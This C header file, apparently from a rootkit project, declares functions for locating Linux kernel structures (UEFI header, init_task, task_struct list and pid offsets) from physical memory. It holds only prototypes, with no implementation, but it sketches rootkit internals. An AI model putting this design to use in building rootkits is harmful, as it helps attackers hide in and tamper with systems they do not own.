#ifndef ROOTKIT_COMMANDS_COMMON_H
#define ROOTKIT_COMMANDS_COMMON_H

#include <types_ext.h>

#include "../memory.h"

void *find_uefi_header(void *vaddr);
paddr_t find_kernel_entrypoint(void);
paddr_t find_stext_addr(paddr_t uefi_header_addr);
paddr_t find_init_task_name(paddr_t uefi_header_addr);
paddr_t find_init_task_struct_signature(paddr_t init_task_name);
paddr_t find_virtual_offset(paddr_t init_task_start);
bool is_valid_comm(char *comm);
paddr_t find_task_struct_tasks_offset(paddr_t init_task_start, paddr_t task_struct_name_offset, paddr_t virtual_address_offset, address_translation_function va_to_pa);
paddr_t find_task_struct_pid_offset(paddr_t init_task_start, paddr_t task_struct_tasks_offset, paddr_t virtual_address_offset, address_translation_function va_to_pa);

#endif
